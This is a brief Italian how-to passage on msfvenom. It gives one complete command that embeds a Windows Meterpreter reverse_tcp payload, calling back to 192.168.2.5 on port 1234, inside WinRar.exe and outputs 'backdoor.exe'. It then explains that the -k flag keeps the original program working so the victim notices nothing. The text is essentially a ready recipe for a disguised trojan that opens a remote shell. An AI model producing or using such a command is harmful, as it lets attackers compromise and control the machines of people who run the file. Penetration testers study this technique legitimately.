msfvenom da la possibilità di steganografia, possiamo quindi inserire il nostro payload dentro un file. abbiamo due opzioni che possiamo utilizzare:

**`msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.5 LPORT=1234 -f exe -k -x ~/Downloads/WinRar.exe > backdoor.exe`**

- **-x /PERCORSO_FILE** inserisce il payload all’interno del file selezionato
- **-k** avvierà il payload e manterrà la funzione del file che abbiamo utilizzato per iniettarci il payload, ovvero se è un file  .exe si aprirà e si eseguirà per lo scopo primario
